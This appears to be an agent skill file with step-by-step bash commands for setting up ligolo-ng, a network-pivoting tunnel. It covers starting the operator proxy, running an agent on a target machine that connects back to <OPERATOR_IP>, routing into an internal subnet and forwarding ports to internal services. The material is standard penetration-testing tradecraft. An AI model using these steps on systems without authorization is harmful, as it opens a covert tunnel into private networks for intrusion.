---
name: setup-ligolo-ng
description: 'Set up ligolo-ng for network pivoting. Use when establishing a TUN-based tunnel from an operator machine through a target/agent to reach an internal network.'
license: Apache-2.0
compatibility: Requires Linux with TUN/TAP support (operator), ligolo-ng proxy and agent binaries. Download from https://github.com/nicocha30/ligolo-ng/releases
metadata:
  author: proxy-tools
  version: "1.0"
allowed-tools: bash
---

# Set Up ligolo-ng Tunnel

ligolo-ng creates a TUN interface on the operator machine. Traffic routed to that interface is forwarded through the TLS-encrypted session to the agent, and then out into the target internal network.

## Operator Setup

```bash
# 1. Create the TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# 2. Start the proxy (listens for agent connections)
./proxy -selfcert -laddr 0.0.0.0:11601
```

## Agent Deployment

```bash
# On the target machine — connect back to the operator
./agent -connect <OPERATOR_IP>:11601 -ignore-cert

# Windows
.\agent.exe -connect <OPERATOR_IP>:11601 -ignore-cert
```

## Activate the Tunnel

In the ligolo-ng proxy interactive shell:

```
ligolo-ng » session              # list and select the agent session
ligolo-ng » start                # start the tunnel

# Back on the OS, add a route for the internal subnet
sudo ip route add 192.168.1.0/24 dev ligolo
```

## Port Redirections (Listeners)

Expose a port on the operator side that tunnels to an internal service:

```
ligolo-ng » listener_add --addr 0.0.0.0:8080 --to 192.168.1.100:80 --tcp
ligolo-ng » listener_list   # show active listeners
```

## Multi-hop Pivoting

See `ligolo-ng/examples/multi-pivot.md` for chaining two ligolo-ng tunnels across two pivot hosts.

## Available Examples

- `ligolo-ng/examples/proxy-setup.md`  — detailed operator-side steps
- `ligolo-ng/examples/agent-setup.md`  — agent deployment (Linux + Windows + systemd)
- `ligolo-ng/examples/port-redirect.md` — listener/port-redirect patterns
- `ligolo-ng/examples/multi-pivot.md`   — multi-hop chaining

## References

- ligolo-ng GitHub: https://github.com/nicocha30/ligolo-ng
- Repository: `ligolo-ng/`
